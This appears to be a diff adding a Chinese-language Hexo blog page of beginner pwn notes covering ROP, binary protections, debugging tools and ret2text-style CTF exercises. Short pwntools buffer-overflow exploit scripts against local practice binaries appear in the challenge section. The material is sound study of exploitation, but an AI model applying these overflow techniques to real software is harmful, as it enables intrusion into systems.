@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>pwn入门基础 - Hexo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="&amp;#x4E00;&amp;#x3001;ROP&amp;#x601D;&amp;#x60F3;&amp;#x5728;&amp;#x6808;&amp;#x7F13;&amp;#x51B2;&amp;#x533A;&amp;#x6EA2;&amp;#x51FA;&amp;#x7684;&amp;#x57FA;&amp;#x7840;&amp;#x4E0A;&amp;#xFF0C;&amp;#x5229;&amp;#x7528;&amp;#x7A0B;&amp;#x5E8F;&amp;#x4E2D;&amp;#x5DF2;&amp;#x6709;&amp;#x7684;&amp;#x5C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门基础">
+<meta property="og:url" content="http://example.com/2019/09/14/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;#x4E00;&amp;#x3001;ROP&amp;#x601D;&amp;#x60F3;&amp;#x5728;&amp;#x6808;&amp;#x7F13;&amp;#x51B2;&amp;#x533A;&amp;#x6EA2;&amp;#x51FA;&amp;#x7684;&amp;#x57FA;&amp;#x7840;&amp;#x4E0A;&amp;#xFF0C;&amp;#x5229;&amp;#x7528;&amp;#x7A0B;&amp;#x5E8F;&amp;#x4E2D;&amp;#x5DF2;&amp;#x6709;&amp;#x7684;&amp;#x5C">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2019/09/14/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/1.png">
+<meta property="og:image" content="http://example.com/2019/09/14/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/2.png">
+<meta property="article:published_time" content="2019-09-14T12:13:47.000Z">
+<meta property="article:modified_time" content="2020-02-03T13:45:09.799Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/09/14/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/1.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            pwn入门基础
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-09-14T12:13:47.000Z" itemprop="datePublished">14 Sep 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            11 minutes read (About 1724 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h3 id="&#x4E00;&#x3001;ROP&#x601D;&#x60F3;"><a href="#&#x4E00;&#x3001;ROP&#x601D;&#x60F3;" class="headerlink" title="&#x4E00;&#x3001;ROP&#x601D;&#x60F3;"></a>&#x4E00;&#x3001;ROP&#x601D;&#x60F3;</h3><p>&#x5728;&#x6808;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x5DF2;&#x6709;&#x7684;&#x5C0F;&#x7247;&#x6BB5;( gadgets )&#x6765;&#x6539;&#x53D8;&#x67D0;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x6216;&#x8005;&#x53D8;&#x91CF;&#x7684;&#x503C;&#xFF0C;&#x4ECE;&#x800C;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x6240;&#x8C13;gadgets &#x5C31;&#x662F;&#x4EE5; ret &#x7ED3;&#x5C3E;&#x7684;&#x6307;&#x4EE4;&#x5E8F;&#x5217;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#x5E8F;&#x5217;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x67D0;&#x4E9B;&#x5730;&#x5740;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x65B9;&#x4FBF;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;<br>&#x4E4B;&#x6240;&#x4EE5;&#x79F0;&#x4E4B;&#x4E3A; ROP&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x6838;&#x5FC3;&#x5728;&#x4E8E;&#x5229;&#x7528;&#x4E86;&#x6307;&#x4EE4;&#x96C6;&#x4E2D;&#x7684; ret &#x6307;&#x4EE4;&#xFF0C;&#x6539;&#x53D8;&#x4E86;&#x6307;&#x4EE4;&#x6D41;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x3002;ROP &#x653B;&#x51FB;&#x4E00;&#x822C;&#x5F97;&#x6EE1;&#x8DB3;&#x5982;&#x4E0B;&#x6761;&#x4EF6;</p>
+<ol>
+<li>&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x6EA2;&#x51FA;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x3002;</li>
+<li>&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684; gadgets &#x4EE5;&#x53CA;&#x76F8;&#x5E94; gadgets &#x7684;&#x5730;&#x5740;&#x3002;</li>
+</ol>
+<a id="more"></a>
+
+<p>&#x5982;&#x679C; gadgets &#x6BCF;&#x6B21;&#x7684;&#x5730;&#x5740;&#x662F;&#x4E0D;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x52A8;&#x6001;&#x83B7;&#x53D6;&#x5BF9;&#x5E94;&#x7684;&#x5730;&#x5740;&#x4E86;</p>
+<h3 id="&#x4E8C;&#x3001;Linux-Pwn&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;"><a href="#&#x4E8C;&#x3001;Linux-Pwn&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;" class="headerlink" title="&#x4E8C;&#x3001;Linux-Pwn&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;"></a>&#x4E8C;&#x3001;Linux-Pwn&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;</h3><h4 id="1&#x3001;checksec-&#x5DE5;&#x5177;&#x68C0;&#x67E5;&#x7F16;&#x8BD1;&#x51FA;&#x7684;&#x6587;&#x4EF6;"><a href="#1&#x3001;checksec-&#x5DE5;&#x5177;&#x68C0;&#x67E5;&#x7F16;&#x8BD1;&#x51FA;&#x7684;&#x6587;&#x4EF6;" class="headerlink" title="1&#x3001;checksec &#x5DE5;&#x5177;&#x68C0;&#x67E5;&#x7F16;&#x8BD1;&#x51FA;&#x7684;&#x6587;&#x4EF6;"></a>1&#x3001;checksec &#x5DE5;&#x5177;&#x68C0;&#x67E5;&#x7F16;&#x8BD1;&#x51FA;&#x7684;&#x6587;&#x4EF6;</h4><figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;/pwn$ checksec stack-example</span><br><span class="line">[*] &apos;/home/kitty/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/stack-example&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></tbody></table></figure>
+<p>1.Canary&#xFF08;&#x6808;&#x4FDD;&#x62A4;&#xFF09;<br>&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x8868;&#x793A;&#x6808;&#x4FDD;&#x62A4;&#x529F;&#x80FD;&#x6709;&#x6CA1;&#x6709;&#x5F00;&#x542F;&#x3002;<br>&#x6808;&#x6EA2;&#x51FA;&#x4FDD;&#x62A4;&#x662F;&#x4E00;&#x79CD;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x7F13;&#x89E3;&#x624B;&#x6BB5;&#xFF0C;&#x5F53;&#x51FD;&#x6570;&#x5B58;&#x5728;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;&#x65F6;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x6808;&#x4E0A;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x6765;&#x8BA9;shellcode&#x80FD;&#x591F;&#x5F97;&#x5230;&#x6267;&#x884C;&#x3002;&#x5F53;&#x542F;&#x7528;&#x6808;&#x4FDD;&#x62A4;&#x540E;&#xFF0C;&#x51FD;&#x6570;&#x5F00;&#x59CB;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5148;&#x5F80;&#x6808;&#x91CC;&#x63D2;&#x5165;cookie&#x4FE1;&#x606F;&#xFF0C;&#x5F53;&#x51FD;&#x6570;&#x771F;&#x6B63;&#x8FD4;&#x56DE;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x9A8C;&#x8BC1;cookie&#x4FE1;&#x606F;&#x662F;&#x5426;&#x5408;&#x6CD5;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5408;&#x6CD5;&#x5C31;&#x505C;&#x6B62;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x3002;&#x653B;&#x51FB;&#x8005;&#x5728;&#x8986;&#x76D6;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x7684;&#x65F6;&#x5019;&#x5F80;&#x5F80;&#x4E5F;&#x4F1A;&#x5C06;cookie&#x4FE1;&#x606F;&#x7ED9;&#x8986;&#x76D6;&#x6389;&#xFF0C;&#x5BFC;&#x81F4;&#x6808;&#x4FDD;&#x62A4;&#x68C0;&#x67E5;&#x5931;&#x8D25;&#x800C;&#x963B;&#x6B62;shellcode&#x7684;&#x6267;&#x884C;&#x3002;&#x5728;Linux&#x4E2D;&#x6211;&#x4EEC;&#x5C06;cookie&#x4FE1;&#x606F;&#x79F0;&#x4E3A;canary&#x3002;</p>
+<p>2.NX/DEP&#xFF08;&#x5806;&#x6808;&#x4E0D;&#x53EF;&#x6267;&#x884C;&#xFF09;<br>NX&#x5373;No-eXecute&#xFF08;&#x4E0D;&#x53EF;&#x6267;&#x884C;&#xFF09;&#x7684;&#x610F;&#x601D;&#xFF0C;NX&#xFF08;DEP&#xFF09;&#x7684;&#x57FA;&#x672C;&#x539F;&#x7406;&#x662F;&#x5C06;&#x6570;&#x636E;&#x6240;&#x5728;&#x5185;&#x5B58;&#x9875;&#x6807;&#x8BC6;&#x4E3A;&#x4E0D;&#x53EF;&#x6267;&#x884C;&#xFF0C;&#x5F53;&#x7A0B;&#x5E8F;&#x6EA2;&#x51FA;&#x6210;&#x529F;&#x8F6C;&#x5165;shellcode&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x5C1D;&#x8BD5;&#x5728;&#x6570;&#x636E;&#x9875;&#x9762;&#x4E0A;&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF0C;&#x6B64;&#x65F6;CPU&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x53BB;&#x6267;&#x884C;&#x6076;&#x610F;&#x6307;&#x4EE4;&#x3002;</p>
+<p>3.PIE/ASLR&#xFF08;&#x5730;&#x5740;&#x968F;&#x673A;&#x5316;&#xFF09;</p>
+<p>4.Fortify<br>&#x8FD9;&#x4E2A;&#x4FDD;&#x62A4;&#x673A;&#x5236;&#x67E5;&#x4E86;&#x5F88;&#x4E45;&#x90FD;&#x6CA1;&#x6709;&#x4E2A;&#x5F88;&#x597D;&#x7684;&#x6C49;&#x8BED;&#x5F62;&#x5BB9;&#xFF0C;&#x6839;&#x636E;&#x6211;&#x7684;&#x7406;&#x89E3;&#x5B83;&#x5176;&#x5B9E;&#x548C;&#x6808;&#x4FDD;&#x62A4;&#x90FD;&#x662F;gcc&#x7684;&#x65B0;&#x7684;&#x4E3A;&#x4E86;&#x589E;&#x5F3A;&#x4FDD;&#x62A4;&#x7684;&#x4E00;&#x79CD;&#x673A;&#x5236;&#xFF0C;&#x9632;&#x6B62;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x3002;&#x7531;&#x4E8E;&#x5E76;&#x4E0D;&#x662F;&#x592A;&#x5E38;&#x89C1;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x592A;&#x591A;&#x7684;&#x4E86;&#x89E3;&#x3002;<br>5.RelRO<br>&#x8BBE;&#x7F6E;&#x7B26;&#x53F7;&#x91CD;&#x5B9A;&#x5411;&#x8868;&#x683C;&#x4E3A;&#x53EA;&#x8BFB;&#x6216;&#x5728;&#x7A0B;&#x5E8F;&#x542F;&#x52A8;&#x65F6;&#x5C31;&#x89E3;&#x6790;&#x5E76;&#x7ED1;&#x5B9A;&#x6240;&#x6709;&#x52A8;&#x6001;&#x7B26;&#x53F7;&#xFF0C;&#x4ECE;&#x800C;&#x51CF;&#x5C11;&#x5BF9;GOT&#xFF08;Global Offset Table&#xFF09;&#x653B;&#x51FB;&#x3002;</p>
+<h4 id="2&#x3001;readelf-objdump"><a href="#2&#x3001;readelf-objdump" class="headerlink" title="2&#x3001;readelf/objdump"></a>2&#x3001;readelf/objdump</h4><p><code>readelf -h ret2text</code>&#x67E5;&#x770B;&#x5934;&#x4FE1;&#x606F;<br><code>readelf -S ret2text</code>&#x663E;&#x793A;&#x8282;&#x533A;&#x8868;&#x5185;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x6BCF;&#x4E2A;&#x8282;&#x7684;&#x5C5E;&#x6027;<br><code>readelf -S ret2text</code>&#x663E;&#x793A;&#x8282;&#x533A;&#x8868;&#x5185;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x6BCF;&#x4E2A;&#x8282;&#x7684;&#x5C5E;&#x6027;<br><code>readelf -t ret2text</code>&#x7528;&#x6765;&#x663E;&#x793A;&#x6240;&#x6709;&#x8282;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;<br><code>readelf -l ret2text</code>&#x663E;&#x793A;&#x7A0B;&#x5E8F;&#x5934;&#x8868;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x6269;&#x6709;&#x51E0;&#x4E2A;&#x6BB5;&#xFF0C;&#x6BCF;&#x4E2A;&#x6BB5;&#x7684;&#x5C5E;&#x6027;<br><code>readelf -r ret2libc1</code>&#x663E;&#x793A;&#x6240;&#x6709;&#x91CD;&#x5B9A;&#x4F4D;&#x5165;&#x53E3;&#x7684;&#x4FE1;&#x606F;<br><code>objdump -s ret2text</code>&#x663E;&#x793A;&#x6307;&#x5B9A;section&#x7684;&#x5B8C;&#x6574;&#x5185;&#x5BB9;<br><code>objdump -h ret2text</code>&#x663E;&#x793A;&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x5404;&#x4E2A;&#x6BB5;&#x7684;&#x5934;&#x90E8;&#x6458;&#x8981;&#x4FE1;&#x606F;&#xFF1A;<br><code>objdump -d ret2text</code>&#x663E;&#x793A;&#x6C47;&#x7F16;&#xFF1A; </p>
+<h4 id="3&#x3001;GDB"><a href="#3&#x3001;GDB" class="headerlink" title="3&#x3001;GDB"></a>3&#x3001;GDB</h4><p>&#x65AD;&#x70B9;<br><code>pwndbg&gt; b *0x80486AE</code><br>&#x8FD0;&#x884C;<br><code>pwndbg&gt; r</code></p>
+<h4 id="4&#x3001;&#x67E5;&#x770B;&#x6BB5;&#x8BFB;&#x5199;&#x6743;&#x9650;"><a href="#4&#x3001;&#x67E5;&#x770B;&#x6BB5;&#x8BFB;&#x5199;&#x6743;&#x9650;" class="headerlink" title="4&#x3001;&#x67E5;&#x770B;&#x6BB5;&#x8BFB;&#x5199;&#x6743;&#x9650;"></a>4&#x3001;&#x67E5;&#x770B;&#x6BB5;&#x8BFB;&#x5199;&#x6743;&#x9650;</h4><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb&gt; b main</span><br><span class="line">gdb&gt; r</span><br><span class="line">gdb&gt; vmmap</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="5&#x3001;ROPgadget"><a href="#5&#x3001;ROPgadget" class="headerlink" title="5&#x3001;ROPgadget"></a>5&#x3001;ROPgadget</h4><p>&#x5BFB;&#x627E;gadget</p>
+<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;$ ROPgadget --binary rop --only &apos;pop|ret&apos;|grep &apos;eax&apos;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x67E5;&#x5B57;&#x7B26;&#x4E32;</p>
+<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;$ ROPgadget --binary rop --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>&#x5BFB;&#x627E;int 0x80 &#x7684;&#x5730;&#x5740;</p>
+<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;$ ROPgadget --binary rop --only &apos;int&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="&#x4E09;&#x3001;IDA&#x7684;&#x64CD;&#x4F5C;"><a href="#&#x4E09;&#x3001;IDA&#x7684;&#x64CD;&#x4F5C;" class="headerlink" title="&#x4E09;&#x3001;IDA&#x7684;&#x64CD;&#x4F5C;"></a>&#x4E09;&#x3001;IDA&#x7684;&#x64CD;&#x4F5C;</h3><h4 id="1&#x3001;&#x67E5;&#x770B;&#x6808;&#x7ED3;&#x6784;"><a href="#1&#x3001;&#x67E5;&#x770B;&#x6808;&#x7ED3;&#x6784;" class="headerlink" title="1&#x3001;&#x67E5;&#x770B;&#x6808;&#x7ED3;&#x6784;"></a>1&#x3001;&#x67E5;&#x770B;&#x6808;&#x7ED3;&#x6784;</h4><p>&#x53CC;&#x51FB;&#x53D8;&#x91CF;&#x5373;&#x53EF;</p>
+<h4 id="2&#x3001;&#x67E5;&#x770B;&#x6BB5;"><a href="#2&#x3001;&#x67E5;&#x770B;&#x6BB5;" class="headerlink" title="2&#x3001;&#x67E5;&#x770B;&#x6BB5;"></a>2&#x3001;&#x67E5;&#x770B;&#x6BB5;</h4><p>ctrl+S</p>
+<h3 id="&#x56DB;&#x3001;&#x4E00;&#x4E9B;&#x7ECF;&#x5178;&#x7684;&#x9898;&#x76EE;"><a href="#&#x56DB;&#x3001;&#x4E00;&#x4E9B;&#x7ECF;&#x5178;&#x7684;&#x9898;&#x76EE;" class="headerlink" title="&#x56DB;&#x3001;&#x4E00;&#x4E9B;&#x7ECF;&#x5178;&#x7684;&#x9898;&#x76EE;"></a>&#x56DB;&#x3001;&#x4E00;&#x4E9B;&#x7ECF;&#x5178;&#x7684;&#x9898;&#x76EE;</h3><h4 id="1&#x3001;stack-example"><a href="#1&#x3001;stack-example" class="headerlink" title="1&#x3001;stack-example"></a>1&#x3001;stack-example</h4><p>&#x6700;&#x5178;&#x578B;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#x5229;&#x7528;&#x662F;&#x8986;&#x76D6;&#x7A0B;&#x5E8F;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x4E3A;&#x653B;&#x51FB;&#x8005;&#x6240;&#x63A7;&#x5236;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5F53;&#x7136;&#x9700;&#x8981;&#x786E;&#x4FDD;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x6240;&#x5728;&#x7684;&#x6BB5;&#x5177;&#x6709;&#x53EF;&#x6267;&#x884C;&#x6743;&#x9650;</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">##coding=utf8</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment">## &#x6784;&#x9020;&#x4E0E;&#x7A0B;&#x5E8F;&#x4EA4;&#x4E92;&#x7684;&#x5BF9;&#x8C61;</span></span><br><span class="line">sh = process(<span class="hljs-string">&apos;./stack_example&apos;</span>)</span><br><span class="line">success_addr = <span class="hljs-number">0x0804843b</span></span><br><span class="line"><span class="hljs-comment">## &#x6784;&#x9020;payload</span></span><br><span class="line">payload = <span class="hljs-string">&apos;a&apos;</span> * <span class="hljs-number">0x14</span> + <span class="hljs-string">&apos;bbbb&apos;</span> + p32(success_addr)</span><br><span class="line"><span class="hljs-built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="hljs-comment">## &#x5411;&#x7A0B;&#x5E8F;&#x53D1;&#x9001;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="hljs-comment">## &#x5C06;&#x4EE3;&#x7801;&#x4EA4;&#x4E92;&#x8F6C;&#x6362;&#x4E3A;&#x624B;&#x5DE5;&#x4EA4;&#x4E92;</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="2&#x3001;ret2text"><a href="#2&#x3001;ret2text" class="headerlink" title="2&#x3001;ret2text"></a>2&#x3001;ret2text</h4><p>ret2text &#x5373;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#x672C;&#x8EAB;&#x5DF2;&#x6709;&#x7684;&#x7684;&#x4EE3;&#x7801;(.text)</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+80h+s] //&#x5176;&#x4E2D;s&#x4E3A;-0x64</span><br><span class="line">80486a7:	8d 44 24 1c          	lea    0x1c(%esp),%eax</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x6240;&#x4EE5;&#x504F;&#x79FB;&#x5730;&#x5740;&#x8BA1;&#x7B97;&#x65B9;&#x5F0F;<br><img src="1.png"><br><img src="2.png"></p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="hljs-string">&apos;./ret2text&apos;</span>)</span><br><span class="line">target = <span class="hljs-number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="hljs-string">&apos;A&apos;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="3&#x3001;ret2shellcode"><a href="#3&#x3001;ret2shellcode" class="headerlink" title="3&#x3001;ret2shellcode"></a>3&#x3001;ret2shellcode</h4><p>ret2shellcode&#xFF0C;&#x5373;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x6267;&#x884C; shellcode&#x4EE3;&#x7801;&#x3002;shellcode &#x6307;&#x7684;&#x662F;&#x7528;&#x4E8E;&#x5B8C;&#x6210;&#x67D0;&#x4E2A;&#x529F;&#x80FD;&#x7684;&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x529F;&#x80FD;&#x4E3B;&#x8981;&#x662F;&#x83B7;&#x53D6;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684; shell&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;shellcode &#x9700;&#x8981;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x586B;&#x5145;&#x3002;&#x8FD9;&#x5176;&#x5B9E;&#x662F;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x5178;&#x578B;&#x7684;&#x5229;&#x7528;&#x65B9;&#x6CD5;&#xFF0C;&#x5373;&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x53BB;&#x586B;&#x5145;&#x4E00;&#x4E9B;&#x53EF;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
